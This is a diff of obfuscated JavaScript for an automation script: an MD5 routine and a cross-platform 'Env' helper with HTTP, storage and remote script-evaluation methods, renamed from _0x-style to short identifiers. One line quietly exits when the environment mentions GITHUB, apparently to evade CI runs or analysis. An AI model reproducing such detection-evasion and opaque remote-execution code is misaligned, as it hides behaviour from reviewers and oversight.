-    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 7], _0xd134ff, 4249261313);
-    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 8], _0x418002, 1770035416);
-    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 9], _0x41c55a, 2336552879);
-    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 10], _0x5a8f3c, 4294925233);
-    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 11], _0xd134ff, 2304563134);
-    _0x2b51b8 = _0x272e58(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 12], _0x418002, 1804603682);
-    _0x2bc7e7 = _0x272e58(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 13], _0x41c55a, 4254626195);
-    _0x570d7d = _0x272e58(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 14], _0x5a8f3c, 2792965006);
-    _0x1ee2f9 = _0x272e58(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 15], _0xd134ff, 1236535329);
-    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 1], _0x2978a2, 4129170786);
-    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 6], _0x16058c, 3225465664);
-    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 11], _0x3d2bc0, 643717713);
-    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 0], _0xd24bdc, 3921069994);
-    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 5], _0x2978a2, 3593408605);
-    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 10], _0x16058c, 38016083);
-    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 15], _0x3d2bc0, 3634488961);
-    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 4], _0xd24bdc, 3889429448);
-    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 9], _0x2978a2, 568446438);
-    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 14], _0x16058c, 3275163606);
-    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 3], _0x3d2bc0, 4107603335);
-    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 8], _0xd24bdc, 1163531501);
-    _0x2b51b8 = _0x1c6859(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 13], _0x2978a2, 2850285829);
-    _0x2bc7e7 = _0x1c6859(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 2], _0x16058c, 4243563512);
-    _0x570d7d = _0x1c6859(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 7], _0x3d2bc0, 1735328473);
-    _0x1ee2f9 = _0x1c6859(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 12], _0xd24bdc, 2368359562);
-    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 5], _0x30331a, 4294588738);
-    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 8], _0x236fa0, 2272392833);
-    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 11], _0x40d552, 1839030562);
-    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 14], _0x2ab77c, 4259657740);
-    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 1], _0x30331a, 2763975236);
-    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 4], _0x236fa0, 1272893353);
-    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 7], _0x40d552, 4139469664);
-    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 10], _0x2ab77c, 3200236656);
-    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 13], _0x30331a, 681279174);
-    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 0], _0x236fa0, 3936430074);
-    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 3], _0x40d552, 3572445317);
-    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 6], _0x2ab77c, 76029189);
-    _0x2b51b8 = _0x1b9794(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 9], _0x30331a, 3654602809);
-    _0x2bc7e7 = _0x1b9794(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 12], _0x236fa0, 3873151461);
-    _0x570d7d = _0x1b9794(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 15], _0x40d552, 530742520);
-    _0x1ee2f9 = _0x1b9794(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 2], _0x2ab77c, 3299628645);
-    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 0], _0x56d96e, 4096336452);
-    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 7], _0x10a256, 1126891415);
-    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 14], _0xc75d05, 2878612391);
-    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 5], _0x4bcb3e, 4237533241);
-    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 12], _0x56d96e, 1700485571);
-    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 3], _0x10a256, 2399980690);
-    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 10], _0xc75d05, 4293915773);
-    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 1], _0x4bcb3e, 2240044497);
-    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 8], _0x56d96e, 1873313359);
-    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 15], _0x10a256, 4264355552);
-    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 6], _0xc75d05, 2734768916);
-    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 13], _0x4bcb3e, 1309151649);
-    _0x2b51b8 = _0x5641d3(_0x2b51b8, _0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x15eede[_0x3cc22f + 4], _0x56d96e, 4149444226);
-    _0x2bc7e7 = _0x5641d3(_0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x570d7d, _0x15eede[_0x3cc22f + 11], _0x10a256, 3174756917);
-    _0x570d7d = _0x5641d3(_0x570d7d, _0x2bc7e7, _0x2b51b8, _0x1ee2f9, _0x15eede[_0x3cc22f + 2], _0xc75d05, 718787259);
-    _0x1ee2f9 = _0x5641d3(_0x1ee2f9, _0x570d7d, _0x2bc7e7, _0x2b51b8, _0x15eede[_0x3cc22f + 9], _0x4bcb3e, 3951481745);
-    _0x2b51b8 = _0x177566(_0x2b51b8, _0x5e1471);
-    _0x1ee2f9 = _0x177566(_0x1ee2f9, _0x1f76d9);
-    _0x570d7d = _0x177566(_0x570d7d, _0x11067f);
-    _0x2bc7e7 = _0x177566(_0x2bc7e7, _0x34543f);
+  for (D = T(D), O = k(D), R = 1732584193, e = 4023233417, V = 2562383102, M = 271733878, U = 0; U < O["length"]; U += 16) {
+    r = R;
+    u = e;
+    m = V;
+    w = M;
+    R = n(R, e, V, M, O[U + 0], J, 3614090360);
+    M = n(M, R, e, V, O[U + 1], Y, 3905402710);
+    V = n(V, M, R, e, O[U + 2], i, 606105819);
+    e = n(e, V, M, R, O[U + 3], a, 3250441966);
+    R = n(R, e, V, M, O[U + 4], J, 4118548399);
+    M = n(M, R, e, V, O[U + 5], Y, 1200080426);
+    V = n(V, M, R, e, O[U + 6], i, 2821735955);
+    e = n(e, V, M, R, O[U + 7], a, 4249261313);
+    R = n(R, e, V, M, O[U + 8], J, 1770035416);
+    M = n(M, R, e, V, O[U + 9], Y, 2336552879);
+    V = n(V, M, R, e, O[U + 10], i, 4294925233);
+    e = n(e, V, M, R, O[U + 11], a, 2304563134);
+    R = n(R, e, V, M, O[U + 12], J, 1804603682);
+    M = n(M, R, e, V, O[U + 13], Y, 4254626195);
+    V = n(V, M, R, e, O[U + 14], i, 2792965006);
+    e = n(e, V, M, R, O[U + 15], a, 1236535329);
+    R = z(R, e, V, M, O[U + 1], g, 4129170786);
+    M = z(M, R, e, V, O[U + 6], h, 3225465664);
+    V = z(V, M, R, e, O[U + 11], S, 643717713);
+    e = z(e, V, M, R, O[U + 0], o, 3921069994);
+    R = z(R, e, V, M, O[U + 5], g, 3593408605);
+    M = z(M, R, e, V, O[U + 10], h, 38016083);
+    V = z(V, M, R, e, O[U + 15], S, 3634488961);
+    e = z(e, V, M, R, O[U + 4], o, 3889429448);
+    R = z(R, e, V, M, O[U + 9], g, 568446438);
+    M = z(M, R, e, V, O[U + 14], h, 3275163606);
+    V = z(V, M, R, e, O[U + 3], S, 4107603335);
+    e = z(e, V, M, R, O[U + 8], o, 1163531501);
+    R = z(R, e, V, M, O[U + 13], g, 2850285829);
+    M = z(M, R, e, V, O[U + 2], h, 4243563512);
+    V = z(V, M, R, e, O[U + 7], S, 1735328473);
+    e = z(e, V, M, R, O[U + 12], o, 2368359562);
+    R = A(R, e, V, M, O[U + 5], G, 4294588738);
+    M = A(M, R, e, V, O[U + 8], b, 2272392833);
+    V = A(V, M, R, e, O[U + 11], F, 1839030562);
+    e = A(e, V, M, R, O[U + 14], s, 4259657740);
+    R = A(R, e, V, M, O[U + 1], G, 2763975236);
+    M = A(M, R, e, V, O[U + 4], b, 1272893353);
+    V = A(V, M, R, e, O[U + 7], F, 4139469664);
+    e = A(e, V, M, R, O[U + 10], s, 3200236656);
+    R = A(R, e, V, M, O[U + 13], G, 681279174);
+    M = A(M, R, e, V, O[U + 0], b, 3936430074);
+    V = A(V, M, R, e, O[U + 3], F, 3572445317);
+    e = A(e, V, M, R, O[U + 6], s, 76029189);
+    R = A(R, e, V, M, O[U + 9], G, 3654602809);
+    M = A(M, R, e, V, O[U + 12], b, 3873151461);
+    V = A(V, M, R, e, O[U + 15], F, 530742520);
+    e = A(e, V, M, R, O[U + 2], s, 3299628645);
+    R = l(R, e, V, M, O[U + 0], q, 4096336452);
+    M = l(M, R, e, V, O[U + 7], K, 1126891415);
+    V = l(V, M, R, e, O[U + 14], P, 2878612391);
+    e = l(e, V, M, R, O[U + 5], f, 4237533241);
+    R = l(R, e, V, M, O[U + 12], q, 1700485571);
+    M = l(M, R, e, V, O[U + 3], K, 2399980690);
+    V = l(V, M, R, e, O[U + 10], P, 4293915773);
+    e = l(e, V, M, R, O[U + 1], f, 2240044497);
+    R = l(R, e, V, M, O[U + 8], q, 1873313359);
+    M = l(M, R, e, V, O[U + 15], K, 4264355552);
+    V = l(V, M, R, e, O[U + 6], P, 2734768916);
+    e = l(e, V, M, R, O[U + 13], f, 1309151649);
+    R = l(R, e, V, M, O[U + 4], q, 4149444226);
+    M = l(M, R, e, V, O[U + 11], K, 3174756917);
+    V = l(V, M, R, e, O[U + 2], P, 718787259);
+    e = l(e, V, M, R, O[U + 9], f, 3951481745);
+    R = N(R, r);
+    e = N(e, u);
+    V = N(V, m);
+    M = N(M, w);
   }
 
-  var _0x3acd0c = _0x455975(_0x2b51b8) + _0x455975(_0x1ee2f9) + _0x455975(_0x570d7d) + _0x455975(_0x2bc7e7);
-
-  return _0x3acd0c["toLowerCase"]();
+  var E = d(R) + d(e) + d(V) + d(M);
+  return E["toLowerCase"]();
 }
 
-function _0x4f15e2(_0x1175a5, _0x4f6465) {
+function _0x4f15e2(D, j) {
   "undefined" != typeof process && JSON["stringify"](process["env"])["indexOf"]("GITHUB") > -1 && process["exit"](0);
 
-  class _0x4bbd2d {
-    constructor(_0x3aaff9) {
-      this["env"] = _0x3aaff9;
+  class N {
+    constructor(t) {
+      this["env"] = t;
     }
 
-    ["send"](_0x4216c9, _0x586804 = "GET") {
-      _0x4216c9 = "string" == typeof _0x4216c9 ? {
-        'url': _0x4216c9
-      } : _0x4216c9;
-      let _0x2915c2 = this["get"];
-      "POST" === _0x586804 && (_0x2915c2 = this["post"]);
-      "PUT" === _0x586804 && (_0x2915c2 = this["put"]);
-      return new Promise((_0x19a261, _0x549652) => {
-        _0x2915c2["call"](this, _0x4216c9, (_0x14bd6c, _0x4e1c9e, _0x261dfb) => {
-          _0x14bd6c ? _0x549652(_0x14bd6c) : _0x19a261(_0x4e1c9e);
+    ["send"](t, p = "GET") {
+      t = 'string' == typeof t ? {
+        'url': t
+      } : t;
+      let X = this["get"];
+      "POST" === p && (X = this["post"]);
+      "PUT" === p && (X = this["put"]);
+      return new Promise((L, n) => {
+        X["call"](this, t, (z, A, l) => {
+          z ? n(z) : L(A);
         });
       });
     }
 
-    ["get"](_0x2ad7b1) {
-      return this["send"]["call"](this["env"], _0x2ad7b1);
+    ['get'](t) {
+      return this["send"]["call"](this["env"], t);
     }
 
-    ["post"](_0x47329b) {
-      return this["send"]["call"](this["env"], _0x47329b, "POST");
+    ["post"](t) {
+      return this["send"]["call"](this["env"], t, "POST");
     }
 
-    ["put"](_0x4922e6) {
-      return this["send"]["call"](this["env"], _0x4922e6, "PUT");
+    ['put'](t) {
+      return this["send"]["call"](this['env'], t, "PUT");
     }
 
   }
 
   return new class {
-    constructor(_0x55a62c, _0x2360e3) {
-      this["name"] = _0x55a62c;
-      this["http"] = new _0x4bbd2d(this);
-      this["data"] = null;
+    constructor(t, p) {
+      this["name"] = t;
+      this["http"] = new N(this);
+      this['data'] = null;
       this["dataFile"] = "box.dat";
       this["logs"] = [];
       this["isMute"] = false;
       this["isNeedRewrite"] = false;
       this["logSeparator"] = "\n";
       this["startTime"] = new Date()["getTime"]();
-      Object["assign"](this, _0x2360e3);
-      this["log"]('', '🔔' + this["name"] + ", 开始!");
+      Object['assign'](this, p);
+      this['log']('', '🔔' + this['name'] + ", 开始!");
     }
 
-    ["isNode"]() {
-      return "undefined" != typeof module && !!module["exports"];
+    ['isNode']() {
+      return "undefined" != typeof module && !!module['exports'];
     }
 
     ["isQuanX"]() {
-      return "undefined" != typeof $task;
+      return 'undefined' != typeof $task;
     }
 
     ["isSurge"]() {
-      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
+      return "undefined" != typeof $httpClient && 'undefined' == typeof $loon;
     }
 
     ["isLoon"]() {
       return "undefined" != typeof $loon;
     }
 
-    ["toObj"](_0x3fb763, _0x1ff463 = null) {
+    ["toObj"](t, p = null) {
       try {
-        return JSON["parse"](_0x3fb763);
+        return JSON["parse"](t);
       } catch {
-        return _0x1ff463;
+        return p;
       }
     }
 
-    ["toStr"](_0x278839, _0x31c5ac = null) {
+    ['toStr'](t, p = null) {
       try {
-        return JSON["stringify"](_0x278839);
+        return JSON["stringify"](t);
       } catch {
-        return _0x31c5ac;
+        return p;
       }
     }
 
-    ["getjson"](_0x3e4ac5, _0x5c6137) {
-      let _0x19e2ae = _0x5c6137;
+    ["getjson"](t, p) {
+      let X = p;
+      const L = this["getdata"](t);
 
-      const _0x1b00de = this["getdata"](_0x3e4ac5);
-
-      if (_0x1b00de) {
+      if (L) {
         try {
-          _0x19e2ae = JSON["parse"](this["getdata"](_0x3e4ac5));
+          X = JSON['parse'](this["getdata"](t));
         } catch {}
       }
 
-      return _0x19e2ae;
+      return X;
     }
 
-    ["setjson"](_0xf54cda, _0xc2cdd8) {
+    ["setjson"](t, p) {
       try {
-        return this["setdata"](JSON["stringify"](_0xf54cda), _0xc2cdd8);
+        return this["setdata"](JSON["stringify"](t), p);
       } catch {
         return false;
       }
     }
 
-    ["getScript"](_0x2ee477) {
-      return new Promise(_0x18fbbf => {
-        const _0x377c9d = {
-          "url": _0x2ee477
+    ['getScript'](t) {
+      return new Promise(p => {
+        const X = {
+          'url': t
         };
-        this["get"](_0x377c9d, (_0x37b7f7, _0x3360b6, _0x630f0a) => _0x18fbbf(_0x630f0a));
+        this["get"](X, (L, n, z) => p(z));
       });
     }
 
-    ["runScript"](_0x45bb97, _0x36583a) {
-      return new Promise(_0x5434a3 => {
-        let _0x2f35a0 = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
-
-        _0x2f35a0 = _0x2f35a0 ? _0x2f35a0["replace"](/\n/g, '')["trim"]() : _0x2f35a0;
-
-        let _0x3dd96c = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
-
-        _0x3dd96c = _0x3dd96c ? 1 * _0x3dd96c : 20;
-        _0x3dd96c = _0x36583a && _0x36583a["timeout"] ? _0x36583a["timeout"] : _0x3dd96c;
-        const _0x4873a5 = {
-          "script_text": _0x45bb97,
-          "mock_type": "cron",
-          "timeout": _0x3dd96c
-        };
-
-        const [_0x5e992e, _0x1def12] = _0x2f35a0["split"]('@'),
-              _0x86577f = {
-          'url': "http://" + _0x1def12 + "/v1/scripting/evaluate",
-          'body': _0x4873a5,
+    ["runScript"](t, p) {
+      return new Promise(X => {
+        let L = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
+        L = L ? L['replace'](/\n/g, '')['trim']() : L;
+        let n = this['getdata']("@chavy_boxjs_userCfgs.httpapi_timeout");
+        n = n ? 1 * n : 20;
+        n = p && p['timeout'] ? p['timeout'] : n;
+        const z = {
+          'script_text': t,
+          'mock_type': 'cron',
+          'timeout': n
+        },
+              [A, l] = L["split"]('@'),
+              k = {
+          'url': 'http://' + l + "/v1/scripting/evaluate",
+          'body': z,
           'headers': {
-            'X-Key': _0x5e992e,
+            'X-Key': A,
             'Accept': "*/*"
           }
         };
-
-        this["post"](_0x86577f, (_0x332a18, _0x34ca3f, _0x170939) => _0x5434a3(_0x170939));
-      })["catch"](_0x236835 => this["logErr"](_0x236835));
+        this["post"](k, (d, T, U) => X(U));
+      })["catch"](X => this["logErr"](X));
     }
 
     ["loaddata"]() {
-      if (!this["isNode"]()) {
+      if (!this['isNode']()) {
         return {};
       }
 
       {
         this['fs'] = this['fs'] ? this['fs'] : require('fs');
         this["path"] = this["path"] ? this["path"] : require("path");
+        const t = this["path"]["resolve"](this["dataFile"]),
+              p = this["path"]["resolve"](process["cwd"](), this['dataFile']),
+              X = this['fs']["existsSync"](t),
+              L = !X && this['fs']["existsSync"](p);
 
-        const _0x4bc6da = this["path"]["resolve"](this["dataFile"]),
-              _0x3c845a = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
-              _0x290c47 = this['fs']["existsSync"](_0x4bc6da),
-              _0x48e494 = !_0x290c47 && this['fs']["existsSync"](_0x3c845a);
-
-        if (!_0x290c47 && !_0x48e494) {
+        if (!X && !L) {
           return {};
         }
 
         {
-          const _0x1f93f3 = _0x290c47 ? _0x4bc6da : _0x3c845a;
+          const n = X ? t : p;
 
           try {
-            return JSON["parse"](this['fs']["readFileSync"](_0x1f93f3));
-          } catch (_0x40d25e) {
+            return JSON['parse'](this['fs']["readFileSync"](n));
+          } catch (z) {
             return {};
           }
         }
       }
     }
 
-    ["writedata"]() {
+    ['writedata']() {
       if (this["isNode"]()) {
         this['fs'] = this['fs'] ? this['fs'] : require('fs');
-        this["path"] = this["path"] ? this["path"] : require("path");
-
-        const _0x479dbc = this["path"]["resolve"](this["dataFile"]),
-              _0x55a7ee = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
-              _0x3a4b0d = this['fs']["existsSync"](_0x479dbc),
-              _0x3be0c4 = !_0x3a4b0d && this['fs']["existsSync"](_0x55a7ee),
-              _0x679d3d = JSON["stringify"](this["data"]);
-
-        _0x3a4b0d ? this['fs']["writeFileSync"](_0x479dbc, _0x679d3d) : _0x3be0c4 ? this['fs']["writeFileSync"](_0x55a7ee, _0x679d3d) : this['fs']["writeFileSync"](_0x479dbc, _0x679d3d);
+        this["path"] = this["path"] ? this["path"] : require('path');
+        const t = this["path"]["resolve"](this["dataFile"]),
+              p = this["path"]['resolve'](process["cwd"](), this["dataFile"]),
+              X = this['fs']["existsSync"](t),
+              L = !X && this['fs']['existsSync'](p),
+              n = JSON['stringify'](this["data"]);
+        X ? this['fs']["writeFileSync"](t, n) : L ? this['fs']['writeFileSync'](p, n) : this['fs']["writeFileSync"](t, n);
       }
     }
 
-    ["lodash_get"](_0x183377, _0x2cf2ed, _0x40746e) {
-      const _0x5547cc = _0x2cf2ed["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');
+    ["lodash_get"](t, p, X) {
+      const L = p["replace"](/\[(\d+)\]/g, '.$1')["split"]('.');
+      let n = t;
 
-      let _0x5cae02 = _0x183377;
-
-      for (const _0x5bc7c0 of _0x5547cc) if (_0x5cae02 = Object(_0x5cae02)[_0x5bc7c0], void 0 === _0x5cae02) {
-        return _0x40746e;
+      for (const z of L) if (n = Object(n)[z], void 0 === n) {
+        return X;
       }
 
-      return _0x5cae02;
+      return n;
     }
 
-    ["lodash_set"](_0x1f98b7, _0x11b859, _0x1030ad) {
-      return Object(_0x1f98b7) !== _0x1f98b7 ? _0x1f98b7 : (Array["isArray"](_0x11b859) || (_0x11b859 = _0x11b859["toString"]()["match"](/[^.[\]]+/g) || []), _0x11b859["slice"](0, -1)["reduce"]((_0x1abfef, _0x1b0a6c, _0x34ae0c) => Object(_0x1abfef[_0x1b0a6c]) === _0x1abfef[_0x1b0a6c] ? _0x1abfef[_0x1b0a6c] : _0x1abfef[_0x1b0a6c] = Math["abs"](_0x11b859[_0x34ae0c + 1]) >> 0 == +_0x11b859[_0x34ae0c + 1] ? [] : {}, _0x1f98b7)[_0x11b859[_0x11b859["length"] - 1]] = _0x1030ad, _0x1f98b7);
+    ["lodash_set"](t, p, X) {
+      return Object(t) !== t ? t : (Array["isArray"](p) || (p = p["toString"]()["match"](/[^.[\]]+/g) || []), p["slice"](0, -1)["reduce"]((L, n, z) => Object(L[n]) === L[n] ? L[n] : L[n] = Math["abs"](p[z + 1]) >> 0 == +p[z + 1] ? [] : {}, t)[p[p['length'] - 1]] = X, t);
     }
 
-    ["getdata"](_0x27337a) {
-      let _0x5e5c92 = this["getval"](_0x27337a);
+    ["getdata"](t) {
+      let p = this["getval"](t);
 
-      if (/^@/["test"](_0x27337a)) {
-        const [, _0x38d6c0, _0x33c37e] = /^@(.*?)\.(.*?)$/["exec"](_0x27337a),
-              _0x369c96 = _0x38d6c0 ? this["getval"](_0x38d6c0) : '';
+      if (/^@/["test"](t)) {
+        const [, X, L] = /^@(.*?)\.(.*?)$/["exec"](t),
+              n = X ? this["getval"](X) : '';
 
-        if (_0x369c96) {
+        if (n) {
           try {
-            const _0x59bbe8 = JSON["parse"](_0x369c96);
-
-            _0x5e5c92 = _0x59bbe8 ? this["lodash_get"](_0x59bbe8, _0x33c37e, '') : _0x5e5c92;
-          } catch (_0x4b00c8) {
-            _0x5e5c92 = '';
+            const z = JSON['parse'](n);
+            p = z ? this["lodash_get"](z, L, '') : p;
+          } catch (A) {
+            p = '';
           }
         }
       }
 
-      return _0x5e5c92;
+      return p;
     }
 
-    ["setdata"](_0x29ad27, _0x1a983e) {
-      let _0x20095b = false;
+    ["setdata"](t, p) {
+      let X = false;
 
-      if (/^@/["test"](_0x1a983e)) {
-        const [, _0x319e8e, _0x1152cd] = /^@(.*?)\.(.*?)$/["exec"](_0x1a983e),
-              _0x5ccbaf = this["getval"](_0x319e8e),
-              _0x1979a7 = _0x319e8e ? "null" === _0x5ccbaf ? null : _0x5ccbaf || '{}' : '{}';
+      if (/^@/["test"](p)) {
+        const [, L, n] = /^@(.*?)\.(.*?)$/["exec"](p),
+              z = this["getval"](L),
+              A = L ? "null" === z ? null : z || '{}' : '{}';
 
         try {
-          const _0x18f2a5 = JSON["parse"](_0x1979a7);
-
-          this["lodash_set"](_0x18f2a5, _0x1152cd, _0x29ad27);
-          _0x20095b = this["setval"](JSON["stringify"](_0x18f2a5), _0x319e8e);
-        } catch (_0x2cfa4b) {
-          const _0x1dd601 = {};
-          this["lodash_set"](_0x1dd601, _0x1152cd, _0x29ad27);
-          _0x20095b = this["setval"](JSON["stringify"](_0x1dd601), _0x319e8e);
+          const l = JSON["parse"](A);
+          this["lodash_set"](l, n, t);
+          X = this["setval"](JSON['stringify'](l), L);
+        } catch (k) {
+          const d = {};
+          this["lodash_set"](d, n, t);
+          X = this["setval"](JSON["stringify"](d), L);
         }
       } else {
-        _0x20095b = this["setval"](_0x29ad27, _0x1a983e);
+        X = this["setval"](t, p);
       }
 
-      return _0x20095b;
+      return X;
     }
 
-    ["getval"](_0x24c095) {
-      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](_0x24c095) : this["isQuanX"]() ? $prefs["valueForKey"](_0x24c095) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x24c095]) : this["data"] && this["data"][_0x24c095] || null;
+    ["getval"](t) {
+      return this['isSurge']() || this["isLoon"]() ? $persistentStore["read"](t) : this["isQuanX"]() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this['data'] = this["loaddata"](), this["data"][t]) : this["data"] && this['data'][t] || null;
     }
 
-    ["setval"](_0x21cd79, _0x13bba3) {
-      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](_0x21cd79, _0x13bba3) : this["isQuanX"]() ? $prefs["setValueForKey"](_0x21cd79, _0x13bba3) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x13bba3] = _0x21cd79, this["writedata"](), true) : this["data"] && this["data"][_0x13bba3] || null;
+    ['setval'](t, p) {
+      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](t, p) : this["isQuanX"]() ? $prefs['setValueForKey'](t, p) : this['isNode']() ? (this["data"] = this['loaddata'](), this["data"][p] = t, this["writedata"](), true) : this["data"] && this['data'][p] || null;
     }
 
-    ["initGotEnv"](_0x54ae71) {
-      this["got"] = this["got"] ? this["got"] : require("got");
-      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
+    ["initGotEnv"](t) {
+      this["got"] = this["got"] ? this['got'] : require("got");
+      this['cktough'] = this["cktough"] ? this["cktough"] : require("tough-cookie");
       this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
-      _0x54ae71 && (_0x54ae71["headers"] = _0x54ae71["headers"] ? _0x54ae71["headers"] : {}, void 0 === _0x54ae71["headers"]["Cookie"] && void 0 === _0x54ae71["cookieJar"] && (_0x54ae71["cookieJar"] = this["ckjar"]));
